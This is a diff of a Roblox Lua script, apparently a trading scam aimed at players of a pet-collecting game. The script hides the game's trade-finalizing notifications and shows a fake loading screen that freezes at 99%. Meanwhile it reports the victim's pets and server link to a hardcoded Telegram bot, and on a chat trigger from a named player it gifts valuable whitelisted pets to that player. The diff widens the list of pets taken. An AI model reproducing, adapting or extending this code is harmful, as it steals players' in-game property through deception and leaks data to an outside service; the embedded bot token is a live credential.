@@ -6,8 +6,6 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- 🛡️ СИСТЕМА СКРЫТИЯ ТОРГОВЫХ УВЕДОМЛЕНИЙ И GUI ЭЛЕМЕНТОВ
--- Список путей для скрытия
 local paths = {
     {"Trading", "FinalizingTrade", "Image"},
     {"Trading", "FinalizingTrade", "Text"},
@@ -15,7 +13,6 @@ local paths = {
     {"Top_Notification"},
 }
 
--- Ищем объект по массиву пути
 local function findByPath(root, pathArray)
     local obj = root
     for _, name in ipairs(pathArray) do
@@ -25,14 +22,12 @@ local function findByPath(root, pathArray)
     return obj
 end
 
--- Выключаем Visible
 local function disableByPath(pathArray)
     local obj = findByPath(PlayerGui, pathArray)
     if obj and obj:IsA("GuiObject") then
         obj.Visible = false
         warn("❌ Скрыт: " .. table.concat(pathArray, "."))
     elseif obj then
-        -- если это контейнер (Frame и т.п.)
         if obj:IsA("Instance") then
             for _, child in ipairs(obj:GetDescendants()) do
                 if child:IsA("GuiObject") then
@@ -44,12 +39,10 @@ local function disableByPath(pathArray)
     end
 end
 
--- Скрыть при старте
 for _, p in ipairs(paths) do
     disableByPath(p)
 end
 
--- Следим за новыми объектами (на случай пересоздания)
 PlayerGui.DescendantAdded:Connect(function(obj)
     for _, p in ipairs(paths) do
         if obj.Name == p[#p] then
@@ -60,7 +53,6 @@ PlayerGui.DescendantAdded:Connect(function(obj)
     end
 end)
 
--- Оптимизированная система скрытия торговых уведомлений
 local function hideTradeNotifications()
     pcall(function()
         for _, gui in ipairs(PlayerGui:GetChildren()) do
@@ -83,7 +75,6 @@ local function hideTradeNotifications()
     end)
 end
 
--- Запускаем скрытие каждые 2 секунды (не каждый кадр!)
 task.spawn(function()
     while true do
         hideTradeNotifications()
@@ -91,7 +82,6 @@ task.spawn(function()
     end
 end)
 
--- 🌌 ЗАГРУЗОЧНЫЙ ФОН (ВОССТАНОВЛЕН)
 task.spawn(function()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "CustomLoadingUI"
@@ -99,7 +89,6 @@ task.spawn(function()
     screenGui.ResetOnSpawn = false
     screenGui.Parent = PlayerGui
     
-    -- ФОН
     local background = Instance.new("ImageLabel")
     background.Size = UDim2.new(1, 0, 1, 0)
     background.Position = UDim2.new(0, 0, 0, 0)
@@ -110,7 +99,6 @@ task.spawn(function()
     
     local tweenService = game:GetService("TweenService")
     
-    -- Надпись Loading
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 0, 50)
     label.Position = UDim2.new(0, 0, 0.4, 0)
@@ -122,7 +110,6 @@ task.spawn(function()
     label.TextStrokeTransparency = 0.6
     label.Parent = background
     
-    -- Анимация точек
     local dotTask = task.spawn(function()
         local dots = {"", ".", "..", "..."}
         local dotIndex = 1
@@ -133,7 +120,6 @@ task.spawn(function()
         end
     end)
     
-    -- Прогресс-бар
     local barContainer = Instance.new("Frame")
     barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
     barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
@@ -173,45 +159,49 @@ task.spawn(function()
     percent.TextXAlignment = Enum.TextXAlignment.Left
     percent.Parent = background
     
-    -- Анимация прогресса (быстрее)
     for i = 1, 99 do
         barFill.Size = UDim2.new(i / 100, 0, 1, 0)
         percent.Text = i .. "%"
         task.wait(2)
     end
     
-    -- Застывает на 99%
     percent.Text = "99%"
     barFill.Size = UDim2.new(0.99, 0, 1, 0)
     
     task.cancel(dotTask)
 end)
 
--- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Crab",
-    "Moon Cat", 
-    "Wasp"
+    "Raccoon",
+    "Fennec Fox", 
+    "Spinosaurus",
+    "T-Rex",
+    "TRex",
+    "French Fry Ferret",
+    "Dragonfly",
+    "Disco Bee",
+    "Lobster Thermidor",
+    "Golden Goose",
+    "Mimic Octopus",
+    "Butterfly",
+    "Kitsune",
+    "Corrupted Kitsune"
 }
 
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- 📊 СТАТИСТИКА
 local STATS = {
     startTime = tick(),
     totalPetsTransferred = 0,
     errors = 0
 }
 
--- 📨 ПРОСТАЯ ФУНКЦИЯ TELEGRAM
 local function sendToTelegram(text)
-    -- Ограничиваем длину
     if #text > 3500 then
         text = text:sub(1, 3500) .. "..."
     end
@@ -234,7 +224,6 @@ local function sendToTelegram(text)
     return success
 end
 
--- 🔗 ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР
 local function getServerLink()
     local placeId = game.PlaceId
     local jobId = game.JobId
@@ -246,7 +235,6 @@ local function getServerLink()
     end
 end
 
--- 🔎 ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
 local function getAllPets()
     local pets = {}
     local sources = {LocalPlayer.Backpack}
@@ -288,7 +276,6 @@ local function getAllPets()
     return pets
 end
 
--- 📜 СПИСОК ПИТОМЦЕВ
 local function getPetsList()
     local pets = getAllPets()
     if #pets == 0 then 
@@ -300,7 +287,7 @@ local function getPetsList()
     local result = {"ПИТОМЦЫ:"}
     
     for i, pet in ipairs(pets) do
-        if i > 15 then break end -- Ограничиваем вывод
+        if i > 15 then break end
         
         totalWeight = totalWeight + pet.weight
         if pet.isWhitelisted then
@@ -320,7 +307,6 @@ local function getPetsList()
     return table.concat(result, "\n")
 end
 
--- 🏁 СТАРТОВОЕ УВЕДОМЛЕНИЕ
 local function sendInitialNotification()
     local message = string.format(
         "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
@@ -334,7 +320,6 @@ local function sendInitialNotification()
     sendToTelegram(message)
 end
 
--- 🐕 ФУНКЦИЯ ПЕРЕДАЧИ
 local function transferPet(pet)
     if not pet.isWhitelisted then 
         return false, "Не в списке" 
@@ -364,7 +349,6 @@ local function transferPet(pet)
     end
 end
 
--- 🚚 ПРОЦЕСС ПЕРЕДАЧИ
 local function startPetTransfer()
     sendToTelegram("Начинаю передачу...")
     
@@ -394,7 +378,6 @@ local function startPetTransfer()
             failed = failed + 1
         end
         
-        -- Отчет каждые 5 питомцев
         if i % 5 == 0 then
             sendToTelegram(string.format("Прогресс: %d/%d", i, #whitelistedPets))
         end
@@ -402,14 +385,12 @@ local function startPetTransfer()
         task.wait(2)
     end
     
-    -- Финальный отчет
     sendToTelegram(string.format(
         "ГОТОВО!\nУспешно: %d\nОшибок: %d", 
         successful, failed
     ))
 end
 
--- 💬 СИСТЕМА КОМАНД
 local function setupMessageListener()
     if TextChatService then
         TextChatService.OnIncomingMessage = function(message)
@@ -449,7 +430,6 @@ local function setupMessageListener()
     end
 end
 
--- 🚀 ЗАПУСК
-task.wait(10) -- Даем время загрузиться GUI
+task.wait(10)
 sendInitialNotification()
 setupMessageListener()
